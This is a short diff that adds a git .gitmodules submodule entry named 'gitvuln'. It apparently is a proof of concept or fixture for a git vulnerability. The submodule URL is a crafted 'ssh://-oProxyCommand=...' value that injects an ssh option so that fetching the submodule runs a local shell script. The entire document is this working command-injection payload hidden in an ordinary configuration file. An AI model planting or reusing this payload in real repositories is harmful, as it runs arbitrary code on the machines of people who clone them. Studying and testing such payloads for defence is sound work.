@@ -1,0 +1,3 @@
+[submodule "gitvuln"]
+	path = gitvuln
+	url = ssh://-oProxyCommand=sh<bootstrap.sh /gitvuln
